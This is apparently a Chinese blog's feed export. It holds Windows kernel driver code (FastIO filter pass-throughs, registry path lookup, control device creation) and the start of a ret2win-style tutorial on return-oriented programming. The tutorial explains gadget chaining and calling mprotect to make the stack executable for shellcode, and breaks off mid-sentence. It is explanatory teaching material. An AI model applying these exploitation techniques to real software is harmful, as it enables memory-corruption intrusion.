class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;PrepareMdlWrite == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">PrepareMdlWrite</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        LockKey,</span><br><span class="line">        MdlChain,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoMdlWriteComplete</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;MdlWriteComplete == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">MdlWriteComplete</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        MdlChain,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoReadCompressed</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL* MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _COMPRESSED_DATA_INFO* CompressedDataInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG CompressedDataInfoLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoReadCompressed == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoReadCompressed</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        LockKey,</span><br><span class="line">        Buffer,</span><br><span class="line">        MdlChain,</span><br><span class="line">        IoStatus,</span><br><span class="line">        CompressedDataInfo,</span><br><span class="line">        CompressedDataInfoLength,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoWriteCompressed</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL* MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _COMPRESSED_DATA_INFO* CompressedDataInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG CompressedDataInfoLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoWriteCompressed == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoWriteCompressed</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        LockKey,</span><br><span class="line">        Buffer,</span><br><span class="line">        MdlChain,</span><br><span class="line">        IoStatus,</span><br><span class="line">        CompressedDataInfo,</span><br><span class="line">        CompressedDataInfoLength,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoMdlReadCompleteCompressed</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;MdlReadCompleteCompressed == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">MdlReadCompleteCompressed</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        MdlChain,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoMdlWriteCompleteCompressed</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;MdlWriteCompleteCompressed == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">MdlWriteCompleteCompressed</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        MdlChain,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoQueryOpen</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PIRP Irp,</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_NETWORK_OPEN_INFORMATION NetworkInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIO_STACK_LOCATION IoStackLocation = <span class="built_in">IoGetCurrentIrpStackLocation</span>(Irp);</span><br><span class="line"></span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoQueryOpen == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IoStackLocation-&gt;DeviceObject = v2;</span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoQueryOpen</span>(</span><br><span class="line">        Irp,</span><br><span class="line">        NetworkInformation,</span><br><span class="line">        v2);</span><br><span class="line">    IoStackLocation-&gt;DeviceObject = DeviceObject;</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">FastIoDetachDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT SourceDevice,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT TargetDevice)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">IoDetachDevice</span>(TargetDevice);</span><br><span class="line">    <span class="built_in">IoDeleteDevice</span>(SourceDevice);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;过滤FastIO&quot;&gt;&lt;a href=&quot;#过滤FastIO&quot; class=&quot;headerlink&quot; title=&quot;过滤FastIO&quot;&gt;&lt;/a&gt;过滤FastIO&lt;/h1&gt;&lt;p&gt;过滤驱动就是挂载在一般驱动，比如磁盘驱动上，拦截IRP、FastIO请求，并有选择的过滤。&lt;</summary>
      
    
    
    
    <category term="Windows Kernel" scheme="https://qianmuoy.github.io/categories/Windows-Kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>从注册表获取驱动程序路径</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E4%BB%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%8E%B7%E5%8F%96%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E8%B7%AF%E5%BE%84/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E4%BB%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%8E%B7%E5%8F%96%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E8%B7%AF%E5%BE%84/</id>
    <published>2024-03-09T12:30:14.000Z</published>
    <updated>2024-03-09T12:30:50.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从注册表获取驱动程序路径"><a href="#从注册表获取驱动程序路径" class="headerlink" title="从注册表获取驱动程序路径"></a>从注册表获取驱动程序路径</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN <span class="title">LoadWorkPath</span><span class="params">()</span>   </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//驱动是由服务加载  KMD.exe</span></span><br><span class="line">    NTSTATUS Status;</span><br><span class="line"></span><br><span class="line">    OBJECT_ATTRIBUTES ObjectAttributes;</span><br><span class="line">    HANDLE KeyHandle;</span><br><span class="line">    KEY_VALUE_PARTIAL_INFORMATION* v5 = <span class="literal">NULL</span>;</span><br><span class="line">    ULONG v7, ResultLength;</span><br><span class="line">    UNICODE_STRING RegPath;</span><br><span class="line">    UNICODE_STRING ValueName;</span><br><span class="line">    UNICODE_STRING v10 = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line">    BOOLEAN IsOk = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExAcquireFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FreeWorkPath</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;RegPath, REG_DRIVER_PATH);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;ValueName, REG_IMAGE_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;ObjectAttributes, &amp;RegPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    Status = <span class="built_in">ZwOpenKey</span>(&amp;KeyHandle, KEY_ALL_ACCESS, &amp;ObjectAttributes);</span><br><span class="line">    <span class="keyword">if</span> (Status != STATUS_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExReleaseFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Status = <span class="built_in">ZwQueryValueKey</span>(KeyHandle, &amp;ValueName, KeyValuePartialInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;ResultLength);   <span class="comment">//获得内存大小</span></span><br><span class="line">    <span class="keyword">if</span> (Status != STATUS_BUFFER_TOO_SMALL &amp;&amp; Status != STATUS_BUFFER_OVERFLOW)</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line"></span><br><span class="line">    v7 = <span class="built_in">sizeof</span>(KEY_VALUE_PARTIAL_INFORMATION) + ResultLength;   <span class="comment">//真正需要的内存大小</span></span><br><span class="line">    v5 = (KEY_VALUE_PARTIAL_INFORMATION*)<span class="built_in">AllocateBuffer</span>(v7);</span><br><span class="line">    <span class="keyword">if</span> (v5 == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//再次枚举数据</span></span><br><span class="line">    Status = <span class="built_in">ZwQueryValueKey</span>(KeyHandle, &amp;ValueName, KeyValuePartialInformation, v5, v7, &amp;ResultLength);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status) == FALSE)</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line"></span><br><span class="line">    v10.Buffer = (WCHAR*)<span class="built_in">AllocateBuffer</span>(v5-&gt;DataLength + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (v10.Buffer == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//RtlZeroMemory(sTempWorkPath.Buffer, pKeyInfo-&gt;DataLength + 2);</span></span><br><span class="line">    <span class="built_in">memcpy</span>(v10.Buffer, v5-&gt;Data, v5-&gt;DataLength);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    kd&gt; db 0xfffffa80`61eef330</span></span><br><span class="line"><span class="comment">fffffa80`61eef330  5c 00 3f 00 3f 00 5c 00-43 00 3a 00 5c 00 39 00  \.?.?.\.C.:.\.9.</span></span><br><span class="line"><span class="comment">fffffa80`61eef340  31 00 31 00 6b 00 69 00-73 00 6b 00 6e 00 6c 00  1.1.k.i.s.k.n.l.</span></span><br><span class="line"><span class="comment">fffffa80`61eef350  36 00 34 00 5c 00 39 00-31 00 31 00 6b 00 69 00  6.4.\.9.1.1.k.i.</span></span><br><span class="line"><span class="comment">fffffa80`61eef360  73 00 6b 00 6e 00 6c 00-36 00 34 00 2e 00 73 00  s.k.n.l.6.4...s.</span></span><br><span class="line"><span class="comment">fffffa80`61eef370  79 00 73 00 00 00 00 00-01 f3 ee 61 80 fa ff ff  y.s..</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;__WorkPath, v10.Buffer);  <span class="comment">//__WorkPath 需要进行内存释放</span></span><br><span class="line">    IsOk = TRUE;</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line">    <span class="built_in">ZwClose</span>(KeyHandle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v5 != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">FreeBuffer</span>(v5);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IsOk == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (v10.Buffer != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">FreeBuffer</span>(v10.Buffer);</span><br><span class="line"></span><br><span class="line">        __WorkPath.Buffer = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExReleaseFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> IsOk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;从注册表获取驱动程序路径&quot;&gt;&lt;a href=&quot;#从注册表获取驱动程序路径&quot; class=&quot;headerlink&quot; title=&quot;从注册表获取驱动程序路径&quot;&gt;&lt;/a&gt;从注册表获取驱动程序路径&lt;/h1&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;ta</summary>
      
    
    
    
    <category term="Windows Kernel" scheme="https://qianmuoy.github.io/categories/Windows-Kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>创建控制设备对象与Ring3交互</title>
    <link href="https://qianmuoy.github.io/2024/03/01/%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E8%AE%BE%E5%A4%87%E5%AF%B9%E8%B1%A1%E4%B8%8ERing3%E4%BA%A4%E4%BA%92/"/>
    <id>https://qianmuoy.github.io/2024/03/01/%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E8%AE%BE%E5%A4%87%E5%AF%B9%E8%B1%A1%E4%B8%8ERing3%E4%BA%A4%E4%BA%92/</id>
    <published>2024-03-01T08:47:13.000Z</published>
    <updated>2024-03-01T08:47:27.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="创建一个控制设备对象"><a href="#创建一个控制设备对象" class="headerlink" title="创建一个控制设备对象"></a>创建一个控制设备对象</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个控制设备对象 (Ring3.exe交互)</span></span><br><span class="line"><span class="function">DEVICE_OBJECT* <span class="title">CreateDevice</span><span class="params">(WCHAR* DeviceName,</span></span></span><br><span class="line"><span class="params"><span class="function">    WCHAR* LinkName,</span></span></span><br><span class="line"><span class="params"><span class="function">    DRIVER_OBJECT* DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN IsDeviceExclusive)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    UNICODE_STRING v1;</span><br><span class="line">    UNICODE_STRING v2;</span><br><span class="line">    DEVICE_OBJECT* DeviceObject = <span class="literal">NULL</span>;   <span class="comment">//一维指针</span></span><br><span class="line">    PDEVICE_EXTENSION DeviceExtension;    <span class="comment">//设备扩展的指针  ????????????</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;v1, DeviceName);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;v2, LinkName);</span><br><span class="line"></span><br><span class="line">    Status = <span class="built_in">IoCreateDevice</span>(</span><br><span class="line">        DriverObject,</span><br><span class="line">        <span class="built_in">sizeof</span>(DEVICE_EXTENSION),</span><br><span class="line">        &amp;v1,</span><br><span class="line">        FILE_DEVICE_UNKNOWN,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        IsDeviceExclusive,</span><br><span class="line">        &amp;DeviceObject);   <span class="comment">//二维指针</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status) == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设备扩展自定义的设备对象的私有数据</span></span><br><span class="line">    DeviceExtension = (PDEVICE_EXTENSION)DeviceObject-&gt;DeviceExtension;  <span class="comment">//系统分配出来的设备扩展</span></span><br><span class="line">    DeviceExtension-&gt;chDriver = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    DeviceExtension-&gt;pFSDeviceObject = <span class="literal">NULL</span>;   <span class="comment">//不需要挂载到设备栈</span></span><br><span class="line">    DeviceExtension-&gt;DeviceType = MAIN_CTRL;</span><br><span class="line"></span><br><span class="line">    DeviceObject-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line">    Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;v2, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status) == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(DeviceObject);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> DeviceObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;创建一个控制设备对象&quot;&gt;&lt;a href=&quot;#创建一个控制设备对象&quot; class=&quot;headerlink&quot; title=&quot;创建一个控制设备对象&quot;&gt;&lt;/a&gt;创建一个控制设备对象&lt;/h1&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;</summary>
      
    
    
    
    <category term="Windows Kernel" scheme="https://qianmuoy.github.io/categories/Windows-Kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>ROP技术实战</title>
    <link href="https://qianmuoy.github.io/2024/03/01/ROP%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98/"/>
    <id>https://qianmuoy.github.io/2024/03/01/ROP%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98/</id>
    <published>2024-03-01T08:44:38.000Z</published>
    <updated>2024-03-01T08:45:10.547Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ROP实战"><a href="#ROP实战" class="headerlink" title="ROP实战"></a>ROP实战</h1><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）</p><p>ROP是一种攻击技术，其中攻击者使用堆栈的控制来在现有程序代码中的子程序中的返回指令之前，立即间接地执行精心挑选的指令或机器指令组。</p><h1 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）</p><p>   ROP是一种攻击技术，其中攻击者使用堆栈的控制来在现有程序代码中的子程序中的返回指令之前，立即间接地执行精心挑选的指令或机器指令组。</p><p>   因为所有执行的指令来自原始程序内的可执行存储器区域，所以这避免了直接代码注入的麻烦，并绕过了用来阻止来自用户控制的存储器的指令的执行的大多数安全措施。</p><p>   因此，ROP技术是可以用来绕过现有的程序内部内存的保护机制的。</p><p>   ROP要完成的任务包括要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。有时目标函数在内存内无法找到，有时目标操作并没有特定的函数可以完美适配，此时就需要在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。假如要执行某段指令（我们将其称为“gadget”，意为小工具），溢出数据应该以下面的方式构造：</p><p>payload : padding + address of gadget</p><p><img src="/.io//image-20240209220652069.png" alt="image-20240209220652069"></p><p>上图是包括单个gadget的溢出</p><p>   如果想连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。所以 gadget 的最后一步应该是 RET 指令，这样程序的控制权（eip）才能得到切换，所以这种技术被称为返回导向编程( Return OrientedProgramming )。要执行多个 gadget，溢出数据应该以下面的方式构造：</p><p>   payload : padding + address of gadget 1 +address of gadget 2 + …… + address of gadget n</p><p>   在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 eip，程序继续跳转执行gadget 2，以此类推。</p><p><img src="/.io//image-20240209220712513.png" alt="image-20240209220712513"></p><p>上图是包含多个gadget的溢出数据</p><p>现在任务可以分解为：针对程序栈溢出所要实现的效果，找到若干段以 ret 作为结束的指令片段，按照上述的构造将它们的地址填充到溢出数据中。所以我们要解决以下几个问题。</p><p>首先，栈溢出之后要实现什么效果？</p><p>   ROP 常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是int 0x80。执行这条指令时，被调用函数的编号应存入 eax，调用参数应按顺序存入ebx，ecx，edx，esi，edi 中。例如，编号125对应函数</p><p>   mprotect (void *addr, size_t len, int prot)</p><p>   可用该函数将栈的属性改为可执行，这样就可以使用 shellcode 了。假如我们想利用系统调用执行这个函数，eax、ebx、ecx、edx 应该分别为“125”、内存栈的分段地址（可以通过调试工具确定）、“0x10000”（需要修改的空间长度，也许需要更长）、“7”（RWX 权限）。</p><p>   其次，如何寻找对应的指令片段？</p><p>   有若干开源工具可以实现搜索以ret 结尾的指令片段，著名的包括ROPgadget、rp++、ropeme 等，甚至也可以用 grep 等文本匹配工具在汇编指令中搜索 ret 